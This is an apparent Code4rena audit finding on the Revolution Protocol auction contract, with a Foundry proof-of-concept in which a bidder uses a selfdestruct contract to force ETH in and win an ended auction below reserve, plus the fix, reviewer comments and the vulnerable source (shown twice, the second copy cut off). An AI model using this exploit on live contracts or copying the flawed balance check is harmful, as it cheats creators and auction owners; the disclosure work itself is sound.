{
  "Title": "[M-01] Bidder can use donations to get VerbsToken from auction that already ended",
  "Content": "\n<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L348> \n\n<https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L365-L368>\n\n*   Token will be auctioned off without following the intended rules resulting in an unfair auction.\n*   Loss of funds for Creators and AuctionHouse owner.\n\n### Proof of Concept\n\nFor this attack to be possible it's necessary that the following happens in the shown order:\n\n1.  Attacker created a bid.\n2.  `AuctionHouse::reservePrice` is increased to a value superior to the already placed bid.\n3.  No new bid is created after `AuctionHouse::reservePrice` is called and the auction ends.\n4.  Attacker donates through `selfdestruct` to `AuctionHouse` the minimum necessary to have `address(AuctionHouse).balance` be greater or equal to `AuctionHouse::reservePrice`.\n5.  Auction is settled.\n6.  Attacker will get the token and creators and AuctionHouse owner will be paid less than expected since their pay will be computed based on `_auction.amount` which is lower than the set `reservePrice`.\n\nTo execute the following code copy paste it into `AuctionSettling.t.sol`\n\n<details>\n\n```solidity\n function testCircumventsMostCreateBidRestrictionsThroughDonationAndReducesTokenPayments() public {\n        createDefaultArtPiece();\n        auction.unpause();\n\n        uint256 balanceBefore = address(dao).balance;\n\n        uint256 bidAmount = auction.reservePrice();\n        uint256 reservePriceIncrease = 0.1 ether;\n        address bidder = address(11);\n        vm.deal(bidder, bidAmount + reservePriceIncrease);\n        vm.startPrank(bidder);\n        auction.createBid{ value: bidAmount }(0, bidder); // Assuming first auction's verbId is 0\n        vm.stopPrank();\n\n        vm.startPrank(auction.owner());\n        // After setting new ReservePrice current bid won't be enough to win the auction\n        auction.setReservePrice(auction.reservePrice() + reservePriceIncrease);\n        assertGt(auction.reservePrice(), bidAmount);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + auction.duration()); // Fast forward time to end the auction\n\n        vm.startPrank(bidder);\n        ContractDonatesEthThroughSelfdestruct donor = new ContractDonatesEthThroughSelfdestruct{value: reservePriceIncrease}();\n        donor.donate(payable(address(auction)));\n        auction.settleCurrentAndCreateNewAuction();\n\n        //Through donation bidder was able to get the token even though the auction had already ended.\n        assertEq(erc721Token.ownerOf(0), bidder);\n\n        //Since payments are calculated using _auction.amount all the involved parties will get\n        //less than they would if reservePrice had been respected.\n        //Code below shows payments were calculated based on bidAmount which is less than the reservePrice.\n        uint256 balanceAfter = address(dao).balance;\n\n        uint256 creatorRate = auction.creatorRateBps();\n        uint256 entropyRate = auction.entropyRateBps();\n\n        //calculate fee\n        uint256 amountToOwner = (bidAmount * (10_000 - (creatorRate * entropyRate) / 10_000)) / 10_000;\n\n        //amount spent on governance\n        uint256 etherToSpendOnGovernanceTotal = (bidAmount * creatorRate) /\n            10_000 -\n            (bidAmount * (entropyRate * creatorRate)) /\n            10_000 /\n            10_000;\n        uint256 feeAmount = erc20TokenEmitter.computeTotalReward(etherToSpendOnGovernanceTotal);\n\n        assertEq(\n            balanceAfter - balanceBefore,\n            amountToOwner - feeAmount\n        );\n    }\n\nContract ContractDonatesEthThroughSelfdestruct {\n    constructor() payable {}\n\n    function donate(address payable target) public {\n        selfdestruct(target);\n    }\n}\n```\n</details>\n\n### Recommended Mitigation Steps\n\nExecute the following diff at `AuctionHouse::_settleAuction` :\n\n```diff\n- if (address(this).balance < reservePrice) {\n+ if (_auction.amount < reservePrice) {\n```\n\n**[rocketman-21 (Revolution) confirmed and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515#issuecomment-1883873532):**\nIdeally the DAO would wait to update the reserve price to line up with the start of a new auction, to ensure some bids will come in. Your call ultimately @0xTheC0der I implemented the fix in any case.\n\n\n**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515#issuecomment-1883903471):**\n > Thanks for the input!\n> \n> > **Ideally** the DAO would wait to update the reserve price to line up with the start of a new auction\n> \n> It's reasonable to assume that this is **not** always the case, therefore this group of issues remains valid.\n> \n> The root cause is the change of parameters mid-auction, while the usage of selfdestruct is \"just\" a very impactful attack path.\n\n_Note: See full discussion [here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/515)._\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-12-revolutionprotocol",
  "Code": [
    {
      "filename": "packages/revolution/src/AuctionHouse.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\n/// @title The Verbs DAO auction house\n\n/*********************************\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░██░░░████░░██░░░████░░░ *\n * ░░██████░░░████████░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n *********************************/\n\n// LICENSE\n// AuctionHouse.sol is a modified version of Zora's AuctionHouse.sol:\n// https://github.com/ourzora/auction-house/blob/54a12ec1a6cf562e49f0a4917990474b11350a2d/contracts/AuctionHouse.sol\n//\n// AuctionHouse.sol source code Copyright Zora licensed under the GPL-3.0 license.\n\npragma solidity ^0.8.22;\n\nimport { PausableUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol\";\nimport { ReentrancyGuardUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\";\nimport { IAuctionHouse } from \"./interfaces/IAuctionHouse.sol\";\nimport { IVerbsToken } from \"./interfaces/IVerbsToken.sol\";\nimport { IWETH } from \"./interfaces/IWETH.sol\";\nimport { IERC20TokenEmitter } from \"./interfaces/IERC20TokenEmitter.sol\";\nimport { ICultureIndex } from \"./interfaces/ICultureIndex.sol\";\nimport { IRevolutionBuilder } from \"./interfaces/IRevolutionBuilder.sol\";\nimport { Ownable2StepUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\nimport { UUPS } from \"./libs/proxy/UUPS.sol\";\nimport { VersionedContract } from \"./version/VersionedContract.sol\";\n\ncontract AuctionHouse is\n    IAuctionHouse,\n    VersionedContract,\n    UUPS,\n    PausableUpgradeable,\n    ReentrancyGuardUpgradeable,\n    Ownable2StepUpgradeable\n{\n    // The Verbs ERC721 token contract\n    IVerbsToken public verbs;\n\n    // The ERC20 governance token\n    IERC20TokenEmitter public erc20TokenEmitter;\n\n    // The address of the WETH contract\n    address public WETH;\n\n    // The minimum amount of time left in an auction after a new bid is created\n    uint256 public timeBuffer;\n\n    // The minimum price accepted in an auction\n    uint256 public reservePrice;\n\n    // The minimum percentage difference between the last bid amount and the current bid\n    uint8 public minBidIncrementPercentage;\n\n    // The split of the winning bid that is reserved for the creator of the Verb in basis points\n    uint256 public creatorRateBps;\n\n    // The all time minimum split of the winning bid that is reserved for the creator of the Verb in basis points\n    uint256 public minCreatorRateBps;\n\n    // The split of (auction proceeds * creatorRate) that is sent to the creator as ether in basis points\n    uint256 public entropyRateBps;\n\n    // The duration of a single auction\n    uint256 public duration;\n\n    // The active auction\n    IAuctionHouse.Auction public auction;\n\n    ///                                                          ///\n    ///                         IMMUTABLES                       ///\n    ///                                                          ///\n\n    /// @notice The contract upgrade manager\n    IRevolutionBuilder public immutable manager;\n\n    // TODO investigate this - The minimum gas threshold for creating an auction (minting VerbsToken)\n    uint32 public constant MIN_TOKEN_MINT_GAS_THRESHOLD = 750_000;\n\n    ///                                                          ///\n    ///                         CONSTRUCTOR                      ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    constructor(address _manager) payable initializer {\n        manager = IRevolutionBuilder(_manager);\n    }\n\n    ///                                                          ///\n    ///                         INITIALIZER                      ///\n    ///                                                          ///\n\n    /**\n     * @notice Initialize the auction house and base contracts,\n     * populate configuration values, and pause the contract.\n     * @dev This function can only be called once.\n     * @param _erc721Token The address of the Verbs ERC721 token contract.\n     * @param _erc20TokenEmitter The address of the ERC-20 token emitter contract.\n     * @param _initialOwner The address of the owner.\n     * @param _weth The address of the WETH contract\n     * @param _auctionParams The auction params for auctions.\n     */\n    function initialize(\n        address _erc721Token,\n        address _erc20TokenEmitter,\n        address _initialOwner,\n        address _weth,\n        IRevolutionBuilder.AuctionParams calldata _auctionParams\n    ) external initializer {\n        require(msg.sender == address(manager), \"Only manager can initialize\");\n        require(_weth != address(0), \"WETH cannot be zero address\");\n\n        __Pausable_init();\n        __ReentrancyGuard_init();\n        __Ownable_init(_initialOwner);\n\n        _pause();\n\n        require(\n            _auctionParams.creatorRateBps >= _auctionParams.minCreatorRateBps,\n            \"Creator rate must be greater than or equal to the creator rate\"\n        );\n\n        verbs = IVerbsToken(_erc721Token);\n        erc20TokenEmitter = IERC20TokenEmitter(_erc20TokenEmitter);\n        timeBuffer = _auctionParams.timeBuffer;\n        reservePrice = _auctionParams.reservePrice;\n        minBidIncrementPercentage = _auctionParams.minBidIncrementPercentage;\n        duration = _auctionParams.duration;\n        creatorRateBps = _auctionParams.creatorRateBps;\n        entropyRateBps = _auctionParams.entropyRateBps;\n        minCreatorRateBps = _auctionParams.minCreatorRateBps;\n        WETH = _weth;\n    }\n\n    /**\n     * @notice Settle the current auction, mint a new Verb, and put it up for auction.\n     */\n    // Can technically reenter via cross function reentrancies in _createAuction, auction, and pause, but those are only callable by the owner.\n    // @wardens if you can find an exploit here go for it - we might be wrong.\n    // slither-disable-next-line reentrancy-eth\n    function settleCurrentAndCreateNewAuction() external override nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /**\n     * @notice Settle the current auction.\n     * @dev This function can only be called when the contract is paused.\n     */\n    function settleAuction() external override whenPaused nonReentrant {\n        _settleAuction();\n    }\n\n    /**\n     * @notice Create a bid for a Verb, with a given amount.\n     * @dev This contract only accepts payment in ETH.\n     * @param verbId The ID of the Verb to bid on.\n     * @param bidder The address of the bidder.\n     */\n    function createBid(uint256 verbId, address bidder) external payable override nonReentrant {\n        IAuctionHouse.Auction memory _auction = auction;\n\n        //require bidder is valid address\n        require(bidder != address(0), \"Bidder cannot be zero address\");\n        require(_auction.verbId == verbId, \"Verb not up for auction\");\n        //slither-disable-next-line timestamp\n        require(block.timestamp < _auction.endTime, \"Auction expired\");\n        require(msg.value >= reservePrice, \"Must send at least reservePrice\");\n        require(\n            msg.value >= _auction.amount + ((_auction.amount * minBidIncrementPercentage) / 100),\n            \"Must send more than last bid by minBidIncrementPercentage amount\"\n        );\n\n        address payable lastBidder = _auction.bidder;\n\n        auction.amount = msg.value;\n        auction.bidder = payable(bidder);\n\n        // Extend the auction if the bid was received within `timeBuffer` of the auction end time\n        bool extended = _auction.endTime - block.timestamp < timeBuffer;\n        if (extended) auction.endTime = _auction.endTime = block.timestamp + timeBuffer;\n\n        // Refund the last bidder, if applicable\n        if (lastBidder != address(0)) _safeTransferETHWithFallback(lastBidder, _auction.amount);\n\n        emit AuctionBid(_auction.verbId, bidder, msg.sender, msg.value, extended);\n\n        if (extended) emit AuctionExtended(_auction.verbId, _auction.endTime);\n    }\n\n    /**\n     * @notice Pause the Verbs auction house.\n     * @dev This function can only be called by the owner when the\n     * contract is unpaused. While no new auctions can be started when paused,\n     * anyone can settle an ongoing auction.\n     */\n    function pause() external override onlyOwner {\n        _pause();\n    }\n\n    /**\n     * @notice Set the split of the winning bid that is reserved for the creator of the Verb in basis points.\n     * @dev Only callable by the owner.\n     * @param _creatorRateBps New creator rate in basis points.\n     */\n    function setCreatorRateBps(uint256 _creatorRateBps) external onlyOwner {\n        require(\n            _creatorRateBps >= minCreatorRateBps,\n            \"Creator rate must be greater than or equal to minCreatorRateBps\"\n        );\n        require(_creatorRateBps <= 10_000, \"Creator rate must be less than or equal to 10_000\");\n        creatorRateBps = _creatorRateBps;\n\n        emit CreatorRateBpsUpdated(_creatorRateBps);\n    }\n\n    /**\n     * @notice Set the minimum split of the winning bid that is reserved for the creator of the Verb in basis points.\n     * @dev Only callable by the owner.\n     * @param _minCreatorRateBps New minimum creator rate in basis points.\n     */\n    function setMinCreatorRateBps(uint256 _minCreatorRateBps) external onlyOwner {\n        require(_minCreatorRateBps <= creatorRateBps, \"Min creator rate must be less than or equal to creator rate\");\n        require(_minCreatorRateBps <= 10_000, \"Min creator rate must be less than or equal to 10_000\");\n\n        //ensure new min rate cannot be lower than previous min rate\n        require(\n            _minCreatorRateBps > minCreatorRateBps,\n            \"Min creator rate must be greater than previous minCreatorRateBps\"\n        );\n\n        minCreatorRateBps = _minCreatorRateBps;\n\n        emit MinCreatorRateBpsUpdated(_minCreatorRateBps);\n    }\n\n    /**\n     * @notice Set the split of (auction proceeds * creatorRate) that is sent to the creator as ether in basis points.\n     * @dev Only callable by the owner.\n     * @param _entropyRateBps New entropy rate in basis points.\n     */\n    function setEntropyRateBps(uint256 _entropyRateBps) external onlyOwner {\n        require(_entropyRateBps <= 10_000, \"Entropy rate must be less than or equal to 10_000\");\n\n        entropyRateBps = _entropyRateBps;\n        emit EntropyRateBpsUpdated(_entropyRateBps);\n    }\n\n    /**\n     * @notice Unpause the Verbs auction house.\n     * @dev This function can only be called by the owner when the\n     * contract is paused. If required, this function will start a new auction.\n     */\n    function unpause() external override onlyOwner {\n        _unpause();\n\n        if (auction.startTime == 0 || auction.settled) {\n            _createAuction();\n        }\n    }\n\n    /**\n     * @notice Set the auction time buffer.\n     * @dev Only callable by the owner.\n     */\n    function setTimeBuffer(uint256 _timeBuffer) external override onlyOwner {\n        timeBuffer = _timeBuffer;\n\n        emit AuctionTimeBufferUpdated(_timeBuffer);\n    }\n\n    /**\n     * @notice Set the auction reserve price.\n     * @dev Only callable by the owner.\n     */\n    function setReservePrice(uint256 _reservePrice) external override onlyOwner {\n        reservePrice = _reservePrice;\n\n        emit AuctionReservePriceUpdated(_reservePrice);\n    }\n\n    /**\n     * @notice Set the auction minimum bid increment percentage.\n     * @dev Only callable by the owner.\n     */\n    function setMinBidIncrementPercentage(uint8 _minBidIncrementPercentage) external override onlyOwner {\n        minBidIncrementPercentage = _minBidIncrementPercentage;\n\n        emit AuctionMinBidIncrementPercentageUpdated(_minBidIncrementPercentage);\n    }\n\n    /**\n     * @notice Create an auction.\n     * @dev Store the auction details in the `auction` state variable and emit an AuctionCreated event.\n     * If the mint reverts, the minter was updated without pausing this contract first. To remedy this,\n     * catch the revert and pause this contract.\n     */\n    function _createAuction() internal {\n        // Check if there's enough gas to safely execute token.mint() and subsequent operations\n        require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD, \"Insufficient gas for creating auction\");\n\n        try verbs.mint() returns (uint256 verbId) {\n            uint256 startTime = block.timestamp;\n            uint256 endTime = startTime + duration;\n\n            auction = Auction({\n                verbId: verbId,\n                amount: 0,\n                startTime: startTime,\n                endTime: endTime,\n                bidder: payable(0),\n                settled: false\n            });\n\n            emit AuctionCreated(verbId, startTime, endTime);\n        } catch {\n            _pause();\n        }\n    }\n\n    /**\n     * @notice Settle an auction, finalizing the bid and paying out to the owner. Pays out to the creator and the owner based on the creatorRateBps and entropyRateBps.\n     * @dev If there are no bids, the Verb is burned.\n     */\n    function _settleAuction() internal {\n        IAuctionHouse.Auction memory _auction = auction;\n\n        require(_auction.startTime != 0, \"Auction hasn't begun\");\n        require(!_auction.settled, \"Auction has already been settled\");\n        //slither-disable-next-line timestamp\n        require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\");\n\n        auction.settled = true;\n\n        uint256 creatorTokensEmitted = 0;\n        // Check if contract balance is greater than reserve price\n        if (address(this).balance < reservePrice) {\n            // If contract balance is less than reserve price, refund to the last bidder\n            if (_auction.bidder != address(0)) {\n                _safeTransferETHWithFallback(_auction.bidder, _auction.amount);\n            }\n\n            // And then burn the Noun\n            verbs.burn(_auction.verbId);\n        } else {\n            //If no one has bid, burn the Verb\n            if (_auction.bidder == address(0))\n                verbs.burn(_auction.verbId);\n                //If someone has bid, transfer the Verb to the winning bidder\n            else verbs.transferFrom(address(this), _auction.bidder, _auction.verbId);\n\n            if (_auction.amount > 0) {\n                // Ether going to owner of the auction\n                uint256 auctioneerPayment = (_auction.amount * (10_000 - creatorRateBps)) / 10_000;\n\n                //Total amount of ether going to creator\n                uint256 creatorsShare = _auction.amount - auctioneerPayment;\n\n                uint256 numCreators = verbs.getArtPieceById(_auction.verbId).creators.length;\n                address deployer = verbs.getArtPieceById(_auction.verbId).sponsor;\n\n                //Build arrays for erc20TokenEmitter.buyToken\n                uint256[] memory vrgdaSplits = new uint256[](numCreators);\n                address[] memory vrgdaReceivers = new address[](numCreators);\n\n                //Transfer auction amount to the DAO treasury\n                _safeTransferETHWithFallback(owner(), auctioneerPayment);\n\n                uint256 ethPaidToCreators = 0;\n\n                //Transfer creator's share to the creator, for each creator, and build arrays for erc20TokenEmitter.buyToken\n                if (creatorsShare > 0 && entropyRateBps > 0) {\n                    for (uint256 i = 0; i < numCreators; i++) {\n                        ICultureIndex.CreatorBps memory creator = verbs.getArtPieceById(_auction.verbId).creators[i];\n                        vrgdaReceivers[i] = creator.creator;\n                        vrgdaSplits[i] = creator.bps;\n\n                        //Calculate paymentAmount for specific creator based on BPS splits - same as multiplying by creatorDirectPayment\n                        uint256 paymentAmount = (creatorsShare * entropyRateBps * creator.bps) / (10_000 * 10_000);\n                        ethPaidToCreators += paymentAmount;\n\n                        //Transfer creator's share to the creator\n                        _safeTransferETHWithFallback(creator.creator, paymentAmount);\n                    }\n                }\n\n                //Buy token from ERC20TokenEmitter for all the creators\n                if (creatorsShare > ethPaidToCreators) {\n                    creatorTokensEmitted = erc20TokenEmitter.buyToken{ value: creatorsShare - ethPaidToCreators }(\n                        vrgdaReceivers,\n                        vrgdaSplits,\n                        IERC20TokenEmitter.ProtocolRewardAddresses({\n                            builder: address(0),\n                            purchaseReferral: address(0),\n                            deployer: deployer\n                        })\n                    );\n                }\n            }\n        }\n\n        emit AuctionSettled(_auction.verbId, _auction.bidder, _auction.amount, creatorTokensEmitted);\n    }\n\n    /// @notice Transfer ETH/WETH from the contract\n    /// @param _to The recipient address\n    /// @param _amount The amount transferring\n    function _safeTransferETHWithFallback(address _to, uint256 _amount) private {\n        // Ensure the contract has enough ETH to transfer\n        if (address(this).balance < _amount) revert(\"Insufficient balance\");\n\n        // Used to store if the transfer succeeded\n        bool success;\n\n        assembly {\n            // Transfer ETH to the recipient\n            // Limit the call to 50,000 gas\n            success := call(50000, _to, _amount, 0, 0, 0, 0)\n        }\n\n        // If the transfer failed:\n        if (!success) {\n            // Wrap as WETH\n            IWETH(WETH).deposit{ value: _amount }();\n\n            // Transfer WETH instead\n            bool wethSuccess = IWETH(WETH).transfer(_to, _amount);\n\n            // Ensure successful transfer\n            if (!wethSuccess) revert(\"WETH transfer failed\");\n        }\n    }\n\n    ///                                                          ///\n    ///                        AUCTION UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner whenPaused {\n        // Ensure the new implementation is registered by the Builder DAO\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}"
    },
    {
      "filename": "packages/revolution/src/AuctionHouse.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\n/// @title The Verbs DAO auction house\n\n/*********************************\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░██░░░████░░██░░░████░░░ *\n * ░░██████░░░████████░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n *********************************/\n\n// LICENSE\n// AuctionHouse.sol is a modified version of Zora's AuctionHouse.sol:\n// https://github.com/ourzora/auction-house/blob/54a12ec1a6cf562e49f0a4917990474b11350a2d/contracts/AuctionHouse.sol\n//\n// AuctionHouse.sol source code Copyright Zora licensed under the GPL-3.0 license.\n\npragma solidity ^0.8.22;\n\nimport { PausableUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol\";\nimport { ReentrancyGuardUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\";\nimport { IAuctionHouse } from \"./interfaces/IAuctionHouse.sol\";\nimport { IVerbsToken } from \"./interfaces/IVerbsToken.sol\";\nimport { IWETH } from \"./interfaces/IWETH.sol\";\nimport { IERC20TokenEmitter } from \"./interfaces/IERC20TokenEmitter.sol\";\nimport { ICultureIndex } from \"./interfaces/ICultureIndex.sol\";\nimport { IRevolutionBuilder } from \"./interfaces/IRevolutionBuilder.sol\";\nimport { Ownable2StepUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\nimport { UUPS } from \"./libs/proxy/UUPS.sol\";\nimport { VersionedContract } from \"./version/VersionedContract.sol\";\n\ncontract AuctionHouse is\n    IAuctionHouse,\n    VersionedContract,\n    UUPS,\n    PausableUpgradeable,\n    ReentrancyGuardUpgradeable,\n    Ownable2StepUpgradeable\n{\n    // The Verbs ERC721 token contract\n    IVerbsToken public verbs;\n\n    // The ERC20 governance token\n    IERC20TokenEmitter public erc20TokenEmitter;\n\n    // The address of the WETH contract\n    address public WETH;\n\n    // The minimum amount of time left in an auction after a new bid is created\n    uint256 public timeBuffer;\n\n    // The minimum price accepted in an auction\n    uint256 public reservePrice;\n\n    // The minimum percentage difference between the last bid amount and the current bid\n    uint8 public minBidIncrementPercentage;\n\n    // The split of the winning bid that is reserved for the creator of the Verb in basis points\n    uint256 public creatorRateBps;\n\n    // The all time minimum split of the winning bid that is reserved for the creator of the Verb in basis points\n    uint256 public minCreatorRateBps;\n\n    // The split of (auction proceeds * creatorRate) that is sent to the creator as ether in basis points\n    uint256 public entropyRateBps;\n\n    // The duration of a single auction\n    uint256 public duration;\n\n    // The active auction\n    IAuctionHouse.Auction public auction;\n\n    ///                                                          ///\n    ///                         IMMUTABLES                       ///\n    ///                                                          ///\n\n    /// @notice The contract upgrade manager\n    IRevolutionBuilder public immutable manager;\n\n    // TODO investigate this - The minimum gas threshold for creating an auction (minting VerbsToken)\n    uint32 public constant MIN_TOKEN_MINT_GAS_THRESHOLD = 750_000;\n\n    ///                                                          ///\n    ///                         CONSTRUCTOR                      ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    constructor(address _manager) payable initializer {\n        manager = IRevolutionBuilder(_manager);\n    }\n\n    ///                                                          ///\n    ///                         INITIALIZER                      ///\n    ///                                                          ///\n\n    /**\n     * @notice Initialize the auction house and base contracts,\n     * populate configuration values, and pause the contract.\n     * @dev This function can only be called once.\n     * @param _erc721Token The address of the Verbs ERC721 token contract.\n     * @param _erc20TokenEmitter The address of the ERC-20 token emitter contract.\n     * @param _initialOwner The address of the owner.\n     * @param _weth The address of the WETH contract\n     * @param _auctionParams The auction params for auctions.\n     */\n    function initialize(\n        address _erc721Token,\n        address _erc20TokenEmitter,\n        address _initialOwner,\n        address _weth,\n        IRevolutionBuilder.AuctionParams calldata _auctionParams\n    ) external initializer {\n        require(msg.sender == address(manager), \"Only manager can initialize\");\n        require(_weth != address(0), \"WETH cannot be zero address\");\n\n        __Pausable_init();\n        __ReentrancyGuard_init();\n        __Ownable_init(_initialOwner);\n\n        _pause();\n\n        require(\n            _auctionParams.creatorRateBps >= _auctionParams.minCreatorRateBps,\n            \"Creator rate must be greater than or equal to the creator rate\"\n        );\n\n        verbs = IVerbsToken(_erc721Token);\n        erc20TokenEmitter = IERC20TokenEmitter(_erc20TokenEmitter);\n        timeBuffer = _auctionParams.timeBuffer;\n        reservePrice = _auctionParams.reservePrice;\n        minBidIncrementPercentage = _auctionParams.minBidIncrementPercentage;\n        duration = _auctionParams.duration;\n        creatorRateBps = _auctionParams.creatorRateBps;\n        entropyRateBps = _auctionParams.entropyRateBps;\n        minCreatorRateBps = _auctionParams.minCreatorRateBps;\n        WETH = _weth;\n    }\n\n    /**\n     * @notice Settle the current auction, mint a new Verb, and put it up for auction.\n     */\n    // Can technically reenter via cross function reentrancies in _createAuction, auction, and pause, but those are only callable by the owner.\n    // @wardens if you can find an exploit here go for it - we might be wrong.\n    // slither-disable-next-line reentrancy-eth\n    function settleCurrentAndCreateNewAuction() external override nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /**\n     * @notice Settle the current auction.\n     * @dev This function can only be called when the contract is paused.\n     */\n    function settleAuction() external override whenPaused nonReentrant {\n        _settleAuction();\n    }\n\n    /**\n     * @notice Create a bid for a Verb, with a given amount.\n     * @dev This contract only accepts payment in ETH.\n     * @param verbId The ID of the Verb to bid on.\n     * @param bidder The address of the bidder.\n     */\n    function createBid(uint256 verbId, address bidder) external payable override nonReentrant {\n        IAuctionHouse.Auction memory _auction = auction;\n\n        //require bidder is valid address\n        require(bidder != address(0), \"Bidder cannot be zero address\");\n        require(_auction.verbId == verbId, \"Verb not up for auction\");\n        //slither-disable-next-line timestamp\n        require(block.timestamp < _auction.endTime, \"Auction expired\");\n        require(msg.value >= reservePrice, \"Must send at least reservePrice\");\n        require(\n            msg.value >= _auction.amount + ((_auction.amount * minBidIncrementPercentage) / 100),\n            \"Must send more than last bid by minBidIncrementPercentage amount\"\n        );\n\n        address payable lastBidder = _auction.bidder;\n\n        auction.amount = msg.value;\n        auction.bidder = payable(bidder);\n\n        // Extend the auction if the bid was received within `timeBuffer` of the auction end time\n        bool extended = _auction.endTime - block.timestamp < timeBuffer;\n        if (extended) auction.endTime = _auction.endTime = block.timestamp + timeBuffer;\n\n        // Refund the last bidder, if applicable\n        if (lastBidder != address(0)) _safeTransferETHWithFallback(lastBidder, _auction.amount);\n\n        emit AuctionBid(_auction.verbId, bidder, msg.sender, msg.value, extended);\n\n        if (extended) emit AuctionExtended(_auction.verbId, _auction.endTime);\n    }\n\n    /**\n     * @notice Pause the Verbs auction house.\n     * @dev This function can only be called by the owner when the\n     * contract is unpaused. While no new auctions can be started when paused,\n     * anyone can settle an ongoing auction.\n     */\n    function pause() external override onlyOwner {\n        _pause();\n    }\n\n    /**\n     * @notice Set the split of the winning bid that is reserved for the creator of the Verb in basis points.\n     * @dev Only callable by the owner.\n     * @param _creatorRateBps New creator rate in basis points.\n     */\n    function setCreatorRateBps(uint256 _creatorRateBps) external onlyOwner {\n        require(\n            _creatorRateBps >= minCreatorRateBps,\n            \"Creator rate must be greater than or equal to minCreatorRateBps\"\n        );\n        require(_creatorRateBps <= 10_000, \"Creator rate must be less than or equal to 10_000\");\n        creatorRateBps = _creatorRateBps;\n\n        emit CreatorRateBpsUpdated(_creatorRateBps);\n    }\n\n    /**\n     * @notice Set the minimum split of the winning bid that is reserved for the creator of the Verb in basis points.\n     * @dev Only callable by the owner.\n     * @param _minCreatorRateBps New minimum creator rate in basis points.\n     */\n    function setMinCreatorRateBps(uint256 _minCreatorRateBps) external onlyOwner {\n        require(_minCreatorRateBps <= creatorRateBps, \"Min creator rate must be less than or equal to creator rate\");\n        require(_minCreatorRateBps <= 10_000, \"Min creator rate must be less than or equal to 10_000\");\n\n        //ensure new min rate cannot be lower than previous min rate\n        require(\n            _minCreatorRateBps > minCreatorRateBps,\n            \"Min creator rate must be greater than previous minCreatorRateBps\"\n        );\n\n        minCreatorRateBps = _minCreatorRateBps;\n\n        emit MinCreatorRateBpsUpdated(_minCreatorRateBps);\n    }\n\n    /**\n     * @notice Set the split of (auction proceeds * creatorRate) that is sent to the creator as ether in basis points.\n     * @dev Only callable by the owner.\n     * @param _entropyRateBps New entropy rate in basis points.\n     */\n    function setEntropyRateBps(uint256 _entropyRateBps) external onlyOwner {\n        require(_entropyRateBps <= 10_000, \"Entropy rate must be less than or equal to 10_000\");\n\n        entropyRateBps = _entropyRateBps;\n        emit EntropyRateBpsUpdated(_entropyRateBps);\n    }\n\n    /**\n     * @notice Unpause the Verbs auction house.\n     * @dev This function can only be called by the owner when the\n     * contract is paused. If required, this function will start a new auction.\n     */\n    function unpause() external override onlyOwner {\n        _unpause();\n\n        if (auction.startTime == 0 || auction.settled) {\n            _createAuction();\n        }\n    }\n\n    /**\n     * @notice Set the auction time buffer.\n     * @dev Only callable by the owner.\n     */\n    function setTimeBuffer(uint256 _timeBuffer) external override onlyOwner {\n        timeBuffer = _timeBuffer;\n\n        emit AuctionTimeBufferUpdated(_timeBuffer);\n    }\n\n    /**\n     * @notice Set the auction reserve price.\n     * @dev Only callable by the owner.\n     */\n    function setReservePrice(uint256 _reservePrice) external override onlyOwner {\n        reservePrice = _reservePrice;\n\n        emit AuctionReservePriceUpdated(_reservePrice);\n    }\n\n    /**\n     * @notice Set the auction minimum bid increment percentage.\n     * @dev Only callable by the owner.\n     */\n    function setMinBidIncrementPercentage(uint8 _minBidIncrementPercentage) external override onlyOwner {\n        minBidIncrementPercentage = _minBidIncrementPercentage;\n\n        emit AuctionMinBidIncrementPercentageUpdated(_minBidIncrementPercentage);\n    }\n\n    /**\n     * @notice Create an auction.\n     * @dev Store the auction details in the `auction` state variable and emit an AuctionCreated event.\n     * If the mint reverts, the minter was updated without pausing this contract first. To remedy this,\n     * catch the revert and pause this 